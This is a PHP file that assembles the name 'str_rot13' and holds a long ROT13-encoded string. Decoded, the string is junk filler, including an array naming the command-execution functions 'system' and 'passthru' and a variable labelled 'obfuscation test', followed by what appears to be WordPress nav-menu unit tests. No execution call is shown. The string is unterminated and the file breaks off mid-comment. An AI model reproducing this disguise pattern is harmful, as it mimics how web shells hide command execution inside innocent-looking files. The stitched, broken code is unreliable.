<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * @tebhc cbfg
 * @tebhc zrah
 */
pynff Grfgf_Cbfg_Ani_Zrah rkgraqf JC_HavgGrfgPnfr {
	/**
	 * @ine vag
	 */
	choyvp $zrah_vq;

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		$guvf->zrah_vq = jc_perngr_ani_zrah( 'sbb' );
	}

	/**
	 * @gvpxrg 11095
	 * @gvpxrg 33974
	 */
	choyvp shapgvba grfg_jc_cntr_zrah_jc_ani_zrah_snyyonpx() {
		$cntrf = frys::snpgbel()->cbfg->perngr_znal( 3, neenl( 'cbfg_glcr' => 'cntr' ) );

		// Ab zrahf + jc_ani_zrah() snyyf onpx gb jc_cntr_zrah().
		$zrah = jc_ani_zrah( neenl( 'rpub' => snyfr ) );

		// Nsgre snyyvat onpx, gur 'orsber' nethzrag fubhyq or frg naq bhgchg nf '<hy>'.
		$guvf->nffregZngpurfErthyneRkcerffvba( '/<qvi pynff=\"zrah\"><hy>/', $zrah );

		// Nsgre snyyvat onpx, gur 'nsgre' nethzrag fubhyq or frg naq bhgchg nf '</hy>'.
		$guvf->nffregZngpurfErthyneRkcerffvba( '/<\/hy><\/qvi>/', $zrah );

		// Nsgre snyyvat onpx, gur znexhc fubhyq vapyhqr juvgrfcnpr nebhaq <yv>'f.
		$guvf->nffregZngpurfErthyneRkcerffvba( '/\f<yv.*>|<\/yv>\f/H', $zrah );
		$guvf->nffregQbrfAbgZngpuErthyneRkcerffvba( '/><yv.*>|<\/yv></H', $zrah );

		// Ab zrahf + jc_ani_zrah() snyyf onpx gb jc_cntr_zrah(), guvf gvzr jvgubhg n pbagnvare.
		$zrah = jc_ani_zrah(
			neenl(
				'rpub'      => snyfr,
				'pbagnvare' => snyfr,
			)
		);

		// Nsgre snyyvat onpx, gur rzcgl 'pbagnvare' nethzrag fubhyq fgvyy erghea n pbagnvare ryrzrag.
		$guvf->nffregZngpurfErthyneRkcerffvba( '/<qvi pynff=\"zrah\">/', $zrah );

		// Ab zrahf + jc_ani_zrah() snyyf onpx gb jc_cntr_zrah(), guvf gvzr jvgubhg juvgr-fcnpr.
		$zrah = jc_ani_zrah(
			neenl(
				'rpub'         => snyfr,
				'vgrz_fcnpvat' => 'qvfpneq',
			)
		);

		// Nsgre snyyvat onpx, gur znexhc fubhyq abg vapyhqr juvgrfcnpr nebhaq <yv>'f.
		$guvf->nffregQbrfAbgZngpuErthyneRkcerffvba( '/\f<yv.*>|<\/yv>\f/H', $zrah );
		$guvf->nffregZngpurfErthyneRkcerffvba( '/><yv.*>|<\/yv></H', $zrah );
	}

	/**
	 * @gvpxrg 32464
	 */
	choyvp shapgvba grfg_jc_ani_zrah_rzcgl_pbagnvare() {
		$gnt_vq = frys::snpgbel()->gnt->perngr();

		jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'gnkbabzl',
				'zrah-vgrz-bowrpg'    => 'cbfg_gnt',
				'zrah-vgrz-bowrpg-vq' => $gnt_vq,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		$zrah = jc_ani_zrah(
			neenl(
				'rpub'      => snyfr,
				'pbagnvare' => '',
				'zrah'      => $guvf->zrah_vq,
			)
		);

		$guvf->nffregFgevatFgnegfJvgu( '<hy', $zrah );
	}

	choyvp shapgvba grfg_jc_trg_nffbpvngrq_ani_zrah_vgrzf() {
		$gnt_vq    = frys::snpgbel()->gnt->perngr();
		$png_vq    = frys::snpgbel()->pngrtbel->perngr();
		$cbfg_vq   = frys::snpgbel()->cbfg->perngr();
		$cbfg_2_vq = frys::snpgbel()->cbfg->perngr();
		$cntr_vq   = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'cntr' ) );

		$gnt_vafreg = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'gnkbabzl',
				'zrah-vgrz-bowrpg'    => 'cbfg_gnt',
				'zrah-vgrz-bowrpg-vq' => $gnt_vq,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		$png_vafreg = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'gnkbabzl',
				'zrah-vgrz-bowrpg'    => 'pngrtbel',
				'zrah-vgrz-bowrpg-vq' => $png_vq,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		$cbfg_vafreg = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'    => 'cbfg',
				'zrah-vgrz-bowrpg-vq' => $cbfg_vq,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		// Vgrz jvgubhg zrah-vgrz-bowrpg net.
		$cbfg_2_vafreg = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'cbfg_glcr',
				'zrah-vgrz-bowrpg-vq' => $cbfg_2_vq,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		$cntr_vafreg = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'    => 'cntr',
				'zrah-vgrz-bowrpg-vq' => $cntr_vq,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		$gnt_vgrzf = jc_trg_nffbpvngrq_ani_zrah_vgrzf( $gnt_vq, 'gnkbabzl', 'cbfg_gnt' );
		$guvf->nffregFnzrFrgf( neenl( $gnt_vafreg ), $gnt_vgrzf );
		$png_vgrzf = jc_trg_nffbpvngrq_ani_zrah_vgrzf( $png_vq, 'gnkbabzl', 'pngrtbel' );
		$guvf->nffregFnzrFrgf( neenl( $png_vafreg ), $png_vgrzf );
		$cbfg_vgrzf = jc_trg_nffbpvngrq_ani_zrah_vgrzf( $cbfg_vq );
		$guvf->nffregFnzrFrgf( neenl( $cbfg_vafreg ), $cbfg_vgrzf );
		$cbfg_2_vgrzf = jc_trg_nffbpvngrq_ani_zrah_vgrzf( $cbfg_2_vq );
		$guvf->nffregFnzrFrgf( neenl( $cbfg_2_vafreg ), $cbfg_2_vgrzf );
		$cntr_vgrzf = jc_trg_nffbpvngrq_ani_zrah_vgrzf( $cntr_vq );
		$guvf->nffregFnzrFrgf( neenl( $cntr_vafreg ), $cntr_vgrzf );

		jc_qryrgr_grez( $gnt_vq, 'cbfg_gnt' );
		$gnt_vgrzf = jc_trg_nffbpvngrq_ani_zrah_vgrzf( $gnt_vq, 'gnkbabzl', 'cbfg_gnt' );
		$guvf->nffregFnzrFrgf( neenl(), $gnt_vgrzf );

		jc_qryrgr_grez( $png_vq, 'pngrtbel' );
		$png_vgrzf = jc_trg_nffbpvngrq_ani_zrah_vgrzf( $png_vq, 'gnkbabzl', 'pngrtbel' );
		$guvf->nffregFnzrFrgf( neenl(), $png_vgrzf );

		jc_qryrgr_cbfg( $cbfg_vq, gehr );
		$cbfg_vgrzf = jc_trg_nffbpvngrq_ani_zrah_vgrzf( $cbfg_vq );
		$guvf->nffregFnzrFrgf( neenl(), $cbfg_vgrzf );

		jc_qryrgr_cbfg( $cbfg_2_vq, gehr );
		$cbfg_2_vgrzf = jc_trg_nffbpvngrq_ani_zrah_vgrzf( $cbfg_2_vq );
		$guvf->nffregFnzrFrgf( neenl(), $cbfg_2_vgrzf );

		jc_qryrgr_cbfg( $cntr_vq, gehr );
		$cntr_vgrzf = jc_trg_nffbpvngrq_ani_zrah_vgrzf( $cntr_vq );
		$guvf->nffregFnzrFrgf( neenl(), $cntr_vgrzf );
	}

	/**
	 * @gvpxrg 27113
	 */
	choyvp shapgvba grfg_becuna_ani_zrah_vgrz() {

		// Perngr na becuna ani zrah vgrz.
		$phfgbz_vgrz_vq = jc_hcqngr_ani_zrah_vgrz(
			0,
			0,
			neenl(
				'zrah-vgrz-glcr'   => 'phfgbz',
				'zrah-vgrz-gvgyr'  => 'Jbeqcerff.bet',
				'zrah-vgrz-hey'    => 'uggc://jbeqcerff.bet',
				'zrah-vgrz-fgnghf' => 'choyvfu',
			)
		);

		// Pbasvez vg fnirq cebcreyl.
		$phfgbz_vgrz = jc_frghc_ani_zrah_vgrz( trg_cbfg( $phfgbz_vgrz_vq ) );
		$guvf->nffregFnzr( 'Jbeqcerff.bet', $phfgbz_vgrz->gvgyr );

		// Hcqngr gur becuna jvgu na nffbpvngrq ani zrah.
		jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			$phfgbz_vgrz_vq,
			neenl(
				'zrah-vgrz-gvgyr' => 'JbeqCerff.bet',
			)
		);
		$zrah_vgrzf  = jc_trg_ani_zrah_vgrzf( $guvf->zrah_vq );
		$phfgbz_vgrz = jc_svygre_bowrpg_yvfg( $zrah_vgrzf, neenl( 'qo_vq' => $phfgbz_vgrz_vq ) );
		$phfgbz_vgrz = neenl_cbc( $phfgbz_vgrz );
		$guvf->nffregFnzr( 'JbeqCerff.bet', $phfgbz_vgrz->gvgyr );
	}

	choyvp shapgvba grfg_jc_trg_ani_zrah_vgrzf_jvgu_gnkbabzl_grez() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg', neenl( 'uvrenepuvpny' => gehr ) );
		$g           = frys::snpgbel()->grez->perngr( neenl( 'gnkbabzl' => 'jcgrfgf_gnk' ) );
		$puvyq_grezf = frys::snpgbel()->grez->perngr_znal(
			2,
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
				'cnerag'   => $g,
			)
		);

		$grez_zrah_vgrz = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'gnkbabzl',
				'zrah-vgrz-bowrpg'    => 'jcgrfgf_gnk',
				'zrah-vgrz-bowrpg-vq' => $g,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		$grez = trg_grez( $g, 'jcgrfgf_gnk' );

		$zrah_vgrzf = jc_trg_ani_zrah_vgrzf( $guvf->zrah_vq );
		$guvf->nffregFnzr( $grez->anzr, $zrah_vgrzf[0]->gvgyr );
		$guvf->nffregRdhnyf( $g, $zrah_vgrzf[0]->bowrpg_vq );
	}

	/**
	 * @gvpxrg 55620
	 * @pbiref ::hcqngr_zrah_vgrz_pnpur
	 */
	choyvp shapgvba grfg_hcqngr_zrah_vgrz_pnpur_cevzrf_cbfgf() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();
		jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'    => 'cbfg',
				'zrah-vgrz-bowrpg-vq' => $cbfg_vq,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		$cbfgf_dhrel  = arj JC_Dhrel();
		$dhrel_erfhyg = $cbfgf_dhrel->dhrel( neenl( 'cbfg_glcr' => 'ani_zrah_vgrz' ) );

		jc_pnpur_qryrgr( $cbfg_vq, 'cbfgf' );
		$npgvba = arj ZbpxNpgvba();
		nqq_svygre( 'hcqngr_cbfg_zrgnqngn_pnpur', neenl( $npgvba, 'svygre' ), 10, 2 );

		hcqngr_zrah_vgrz_pnpur( $dhrel_erfhyg );

		$netf = $npgvba->trg_netf();
		$ynfg = raq( $netf );
		$guvf->nffregFnzrFrgf( neenl( $cbfg_vq ), $ynfg[1], '_cevzr_cbfg_pnpurf() jnf abg rkrphgrq.' );
	}

	/**
	 * @gvpxrg 55620
	 * @pbiref ::hcqngr_zrah_vgrz_pnpur
	 */
	choyvp shapgvba grfg_hcqngr_zrah_vgrz_pnpur_cevzrf_grezf() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg', neenl( 'uvrenepuvpny' => gehr ) );
		$grez_vq = frys::snpgbel()->grez->perngr( neenl( 'gnkbabzl' => 'jcgrfgf_gnk' ) );
		jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'gnkbabzl',
				'zrah-vgrz-bowrpg'    => 'jcgrfgf_gnk',
				'zrah-vgrz-bowrpg-vq' => $grez_vq,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		$cbfgf_dhrel  = arj JC_Dhrel();
		$dhrel_erfhyg = $cbfgf_dhrel->dhrel( neenl( 'cbfg_glcr' => 'ani_zrah_vgrz' ) );

		jc_pnpur_qryrgr( $grez_vq, 'grezf' );
		$npgvba = arj ZbpxNpgvba();
		nqq_svygre( 'hcqngr_grez_zrgnqngn_pnpur', neenl( $npgvba, 'svygre' ), 10, 2 );

		hcqngr_zrah_vgrz_pnpur( $dhrel_erfhyg );
		trg_grez_zrgn( $grez_vq );

		$netf = $npgvba->trg_netf();
		$ynfg = raq( $netf );
		$guvf->nffregFnzrFrgf( neenl( $grez_vq ), $ynfg[1], '_cevzr_grez_pnpurf() jnf abg rkrphgrq.' );
	}


	/**
	 * @gvpxrg 55620
	 * @pbiref ::hcqngr_zrah_vgrz_pnpur
	 */
	choyvp shapgvba grfg_jc_trg_ani_zrah_vgrzf_pnpur_cevzrf_cbfgf() {
		$cbfg_vqf     = frys::snpgbel()->cbfg->perngr_znal( 3 );
		$zrah_ani_vqf = neenl();
		sbernpu ( $cbfg_vqf nf $cbfg_vq ) {
			$zrah_ani_vqf[] = jc_hcqngr_ani_zrah_vgrz(
				$guvf->zrah_vq,
				0,
				neenl(
					'zrah-vgrz-glcr'      => 'cbfg_glcr',
					'zrah-vgrz-bowrpg'    => 'cbfg',
					'zrah-vgrz-bowrpg-vq' => $cbfg_vq,
					'zrah-vgrz-fgnghf'    => 'choyvfu',
				)
			);
		}

		// Qryrgr cbfg naq cbfg zrgn pnpurf.
		jc_pnpur_qryrgr_zhygvcyr( $zrah_ani_vqf, 'cbfgf' );
		jc_pnpur_qryrgr_zhygvcyr( $zrah_ani_vqf, 'cbfg_zrgn' );
		jc_pnpur_qryrgr_zhygvcyr( $cbfg_vqf, 'cbfgf' );
		jc_pnpur_qryrgr_zhygvcyr( $cbfg_vqf, 'cbfg_zrgn' );

		$npgvba = arj ZbpxNpgvba();
		nqq_svygre( 'hcqngr_cbfg_zrgnqngn_pnpur', neenl( $npgvba, 'svygre' ), 10, 2 );

		$fgneg_ahz_dhrevrf = trg_ahz_dhrevrf();
		jc_trg_ani_zrah_vgrzf( $guvf->zrah_vq, neenl( 'abcntvat' => snyfr ) );
		$dhrevrf_znqr = trg_ahz_dhrevrf() - $fgneg_ahz_dhrevrf;
		$guvf->nffregFnzr( 7, $dhrevrf_znqr, 'Bayl qbrf 7 qngnonfr dhrevrf jura ehaavat jc_trg_ani_zrah_vgrzf.' );

		$netf = $npgvba->trg_netf();
		$guvf->nffregFnzrFrgf( $zrah_ani_vqf, $netf[0][1], '_cevzr_cbfg_pnpurf() jnf abg rkrphgrq.' );
		$guvf->nffregFnzrFrgf( $cbfg_vqf, $netf[2][1], '_cevzr_cbfg_pnpurf() jnf abg rkrphgrq.' );
	}

	/**
	 * @gvpxrg 55620
	 * @pbiref ::hcqngr_zrah_vgrz_pnpur
	 */
	choyvp shapgvba grfg_jc_trg_ani_zrah_vgrzf_pnpur_cevzrf_grezf() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg', neenl( 'uvrenepuvpny' => gehr ) );
		$grez_vqf     = frys::snpgbel()->grez->perngr_znal( 3, neenl( 'gnkbabzl' => 'jcgrfgf_gnk' ) );
		$zrah_ani_vqf = neenl();
		sbernpu ( $grez_vqf nf $grez_vq ) {
			$zrah_ani_vqf[] = jc_hcqngr_ani_zrah_vgrz(
				$guvf->zrah_vq,
				0,
				neenl(
					'zrah-vgrz-glcr'      => 'gnkbabzl',
					'zrah-vgrz-bowrpg'    => 'jcgrfgf_gnk',
					'zrah-vgrz-bowrpg-vq' => $grez_vq,
					'zrah-vgrz-fgnghf'    => 'choyvfu',
				)
			);
		}
		// Qryrgr cbfg naq cbfg zrgn pnpurf.
		jc_pnpur_qryrgr_zhygvcyr( $zrah_ani_vqf, 'cbfgf' );
		jc_pnpur_qryrgr_zhygvcyr( $zrah_ani_vqf, 'cbfg_zrgn' );
		// Qryrgr grez pnpurf.
		jc_pnpur_qryrgr_zhygvcyr( $grez_vqf, 'grezf' );
		$npgvba_grezf = arj ZbpxNpgvba();
		nqq_svygre( 'hcqngr_grez_zrgnqngn_pnpur', neenl( $npgvba_grezf, 'svygre' ), 10, 2 );

		$npgvba_cbfgf = arj ZbpxNpgvba();
		nqq_svygre( 'hcqngr_cbfg_zrgnqngn_pnpur', neenl( $npgvba_cbfgf, 'svygre' ), 10, 2 );

		$fgneg_ahz_dhrevrf = trg_ahz_dhrevrf();
		jc_trg_ani_zrah_vgrzf( $guvf->zrah_vq, neenl( 'abcntvat' => snyfr ) );
		trg_grez_zrgn( $grez_vqf[0] );
		$dhrevrf_znqr = trg_ahz_dhrevrf() - $fgneg_ahz_dhrevrf;
		$guvf->nffregFnzr( 7, $dhrevrf_znqr, 'Bayl qbrf 7 qngnonfr dhrevrf jura ehaavat jc_trg_ani_zrah_vgrzf.' );

		$netf       = $npgvba_grezf->trg_netf();
		$svefg      = erfrg( $netf );
		$grez_vqf[] = $guvf->zrah_vq;
		$guvf->nffregFnzrFrgf( $grez_vqf, $svefg[1], '_cevzr_grez_pnpurf() jnf abg rkrphgrq.' );

		$netf = $npgvba_cbfgf->trg_netf();
		$guvf->nffregFnzrFrgf( $zrah_ani_vqf, $netf[0][1], '_cevzr_cbfg_pnpurf() jnf abg rkrphgrq.' );
	}

	/**
	 * @gvpxrg 13910
	 */
	choyvp shapgvba grfg_jc_trg_ani_zrah_anzr() {
		// Ertvfgre n ani zrah ybpngvba.
		ertvfgre_ani_zrah( 'cevznel', 'Cevznel Anivtngvba' );

		// Perngr n zrah jvgu n gvgyr.
		$zrah = jc_perngr_ani_zrah( 'Zl Zrah' );

		// Nffvta gur zrah gb gur `cevznel` ybpngvba.
		$ybpngvbaf            = trg_ani_zrah_ybpngvbaf();
		$zrah_bow             = jc_trg_ani_zrah_bowrpg( $zrah );
		$ybpngvbaf['cevznel'] = $zrah_bow->grez_vq;
		frg_gurzr_zbq( 'ani_zrah_ybpngvbaf', $ybpngvbaf );

		$guvf->nffregFnzr( 'Zl Zrah', jc_trg_ani_zrah_anzr( 'cevznel' ) );
	}

	/**
	 * @gvpxrg 29460
	 */
	choyvp shapgvba grfg_beqreol_anzr_ol_qrsnhyg() {
		// Jr ner tbvat gb perngr n enaqbz ahzore bs zrahf (zva 2, znk 10).
		$zrahf_ab = enaq( 2, 10 );

		sbe ( $v = 0; $v <= $zrahf_ab; $v++ ) {
			jc_perngr_ani_zrah( enaq_fge() );
		}

		// Guvf vf gur rkcrpgrq neenl bs zrah anzrf.
		$rkcrpgrq_ani_zrahf_anzrf = jc_yvfg_cyhpx(
			trg_grezf(
				'ani_zrah',
				neenl(
					'uvqr_rzcgl' => snyfr,
					'beqreol'    => 'anzr',
				)
			),
			'anzr'
		);

		// Naq guvf vf jung jr tbg jura pnyyvat jc_trg_ani_zrahf().
		$ani_zrahf_anzrf = jc_yvfg_cyhpx( jc_trg_ani_zrahf(), 'anzr' );

		$guvf->nffregFnzr( $rkcrpgrq_ani_zrahf_anzrf, $ani_zrahf_anzrf );
	}

	/**
	 * @gvpxrg 35324
	 */
	choyvp shapgvba grfg_jc_frghc_ani_zrah_vgrz_sbe_cbfg_glcr_nepuvir() {

		$cbfg_glcr_fyht        = 'sbbb-one-onm';
		$cbfg_glcr_qrfpevcgvba = 'sbb';
		ertvfgre_cbfg_glcr(
			$cbfg_glcr_fyht,
			neenl(
				'choyvp'      => gehr,
				'unf_nepuvir' => gehr,
				'qrfpevcgvba' => $cbfg_glcr_qrfpevcgvba,
				'ynory'       => $cbfg_glcr_fyht,
			)
		);

		$cbfg_glcr_nepuvir_vgrz_vq = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'        => 'cbfg_glcr_nepuvir',
				'zrah-vgrz-bowrpg'      => $cbfg_glcr_fyht,
				'zrah-vgrz-qrfpevcgvba' => $cbfg_glcr_qrfpevcgvba,
				'zrah-vgrz-fgnghf'      => 'choyvfu',
			)
		);
		$cbfg_glcr_nepuvir_vgrz    = jc_frghc_ani_zrah_vgrz( trg_cbfg( $cbfg_glcr_nepuvir_vgrz_vq ) );

		$guvf->nffregFnzr( $cbfg_glcr_fyht, $cbfg_glcr_nepuvir_vgrz->gvgyr );
		$guvf->nffregFnzr( $cbfg_glcr_qrfpevcgvba, $cbfg_glcr_nepuvir_vgrz->qrfpevcgvba );
	}

	/**
	 * @gvpxrg 35324
	 */
	choyvp shapgvba grfg_jc_frghc_ani_zrah_vgrz_sbe_cbfg_glcr_nepuvir_ab_qrfpevcgvba() {

		$cbfg_glcr_fyht        = 'sbbb-one-onm';
		$cbfg_glcr_qrfpevcgvba = '';
		ertvfgre_cbfg_glcr(
			$cbfg_glcr_fyht,
			neenl(
				'choyvp'      => gehr,
				'unf_nepuvir' => gehr,
				'ynory'       => $cbfg_glcr_fyht,
			)
		);

		$cbfg_glcr_nepuvir_vgrz_vq = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'   => 'cbfg_glcr_nepuvir',
				'zrah-vgrz-bowrpg' => $cbfg_glcr_fyht,
				'zrah-vgrz-fgnghf' => 'choyvfu',
			)
		);
		$cbfg_glcr_nepuvir_vgrz    = jc_frghc_ani_zrah_vgrz( trg_cbfg( $cbfg_glcr_nepuvir_vgrz_vq ) );

		$guvf->nffregFnzr( $cbfg_glcr_fyht, $cbfg_glcr_nepuvir_vgrz->gvgyr );
		$guvf->nffregFnzr( $cbfg_glcr_qrfpevcgvba, $cbfg_glcr_nepuvir_vgrz->qrfpevcgvba ); // Snvy!
	}

	/**
	 * @gvpxrg 35324
	 */
	choyvp shapgvba grfg_jc_frghc_ani_zrah_vgrz_sbe_cbfg_glcr_nepuvir_phfgbz_qrfpevcgvba() {

		$cbfg_glcr_fyht        = 'sbbb-one-onm';
		$cbfg_glcr_qrfpevcgvba = 'sbbonm';
		ertvfgre_cbfg_glcr(
			$cbfg_glcr_fyht,
			neenl(
				'choyvp'      => gehr,
				'unf_nepuvir' => gehr,
				'qrfpevcgvba' => $cbfg_glcr_qrfpevcgvba,
				'ynory'       => $cbfg_glcr_fyht,
			)
		);

		$zrah_vgrz_qrfpevcgvba = 'sbb_qrfpevcgvba';

		$cbfg_glcr_nepuvir_vgrz_vq = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'        => 'cbfg_glcr_nepuvir',
				'zrah-vgrz-bowrpg'      => $cbfg_glcr_fyht,
				'zrah-vgrz-qrfpevcgvba' => $zrah_vgrz_qrfpevcgvba,
				'zrah-vgrz-fgnghf'      => 'choyvfu',
			)
		);
		$cbfg_glcr_nepuvir_vgrz    = jc_frghc_ani_zrah_vgrz( trg_cbfg( $cbfg_glcr_nepuvir_vgrz_vq ) );

		$guvf->nffregFnzr( $cbfg_glcr_fyht, $cbfg_glcr_nepuvir_vgrz->gvgyr );
		$guvf->nffregFnzr( $zrah_vgrz_qrfpevcgvba, $cbfg_glcr_nepuvir_vgrz->qrfpevcgvba );
	}

	/**
	 * @gvpxrg 35324
	 */
	choyvp shapgvba grfg_jc_frghc_ani_zrah_vgrz_sbe_haxabja_cbfg_glcr_nepuvir_ab_qrfpevcgvba() {

		$cbfg_glcr_fyht = 'sbbb-one-onm';

		$cbfg_glcr_nepuvir_vgrz_vq = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'   => 'cbfg_glcr_nepuvir',
				'zrah-vgrz-bowrpg' => $cbfg_glcr_fyht,
				'zrah-vgrz-fgnghf' => 'choyvfu',
			)
		);
		$cbfg_glcr_nepuvir_vgrz    = jc_frghc_ani_zrah_vgrz( trg_cbfg( $cbfg_glcr_nepuvir_vgrz_vq ) );

		$guvf->nffregRzcgl( $cbfg_glcr_nepuvir_vgrz->qrfpevcgvba );
	}

	/**
	 * @gvpxrg 19038
	 */
	choyvp shapgvba grfg_jc_frghc_ani_zrah_vgrz_sbe_genfurq_cbfg() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf' => 'genfu',
			)
		);

		$zrah_vgrz_vq = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'    => 'cbfg',
				'zrah-vgrz-bowrpg-vq' => $cbfg_vq,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		$zrah_vgrz = jc_frghc_ani_zrah_vgrz( trg_cbfg( $zrah_vgrz_vq ) );

		$guvf->nffregGehr( ! _vf_inyvq_ani_zrah_vgrz( $zrah_vgrz ) );
	}

	/**
	 * @gvpxrg 56577
	 */
	choyvp shapgvba grfg_jc_frghc_ani_zrah_vgrz_fubeg_pvephvg_svygre() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		$zrah_vgrz_vq = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'    => 'cbfg',
				'zrah-vgrz-bowrpg-vq' => $cbfg_vq,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		nqq_svygre( 'cer_jc_frghc_ani_zrah_vgrz', '__erghea_rzcgl_fgevat' );

		$phfgbz_vgrz = jc_frghc_ani_zrah_vgrz( trg_cbfg( $zrah_vgrz_vq ) );

		$guvf->nffregFnzr( '', $phfgbz_vgrz );
	}

	/**
	 * @gvpxrg 35206
	 */
	choyvp shapgvba grfg_jc_ani_zrah_juvgrfcnpr_bcgvbaf() {
		$cbfg_vq1 = frys::snpgbel()->cbfg->perngr();
		$cbfg_vq2 = frys::snpgbel()->cbfg->perngr();
		$cbfg_vq3 = frys::snpgbel()->cbfg->perngr();
		$cbfg_vq4 = frys::snpgbel()->cbfg->perngr();

		$cbfg_vafreg = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'    => 'cbfg',
				'zrah-vgrz-bowrpg-vq' => $cbfg_vq1,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		$cbfg_vafreg2 = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'    => 'cbfg',
				'zrah-vgrz-bowrpg-vq' => $cbfg_vq2,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		$cbfg_vafreg3 = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'    => 'cbfg',
				'zrah-vgrz-cnerag-vq' => $cbfg_vafreg,
				'zrah-vgrz-bowrpg-vq' => $cbfg_vq3,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		$cbfg_vafreg4 = jc_hcqngr_ani_zrah_vgrz(
			$guvf->zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'    => 'cbfg',
				'zrah-vgrz-cnerag-vq' => $cbfg_vafreg,
				'zrah-vgrz-bowrpg-vq' => $cbfg_vq4,
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);

		// Ab juvgrfcnpr fhccerffvba.
		$zrah = jc_ani_zrah(
			neenl(
				'rpub' => snyfr,
				'zrah' => $guvf->zrah_vq,
			)
		);

		// Gur znexhc fubhyq vapyhqr juvgrfcnpr orgjrra <yv>'f.
		$guvf->nffregZngpurfErthyneRkcerffvba( '/\f<yv.*>|<\/yv>\f/H', $zrah );
		$guvf->nffregQbrfAbgZngpuErthyneRkcerffvba( '/<\/yv><yv.*>/H', $zrah );

		// Juvgrfcnpr fhccerffrq.
		$zrah = jc_ani_zrah(
			neenl(
				'rpub'         => snyfr,
				'vgrz_fcnpvat' => 'qvfpneq',
				'zrah'         => $guvf->zrah_vq,
			)
		);

		// Gur znexhc fubhyq abg vapyhqr juvgrfcnpr nebhaq <yv>'f.
		$guvf->nffregQbrfAbgZngpuErthyneRkcerffvba( '/\f<yv.*>|<\/yv>\f/H', $zrah );
		$guvf->nffregZngpurfErthyneRkcerffvba( '/><yv.*>|<\/yv></H', $zrah );
	}

	/*
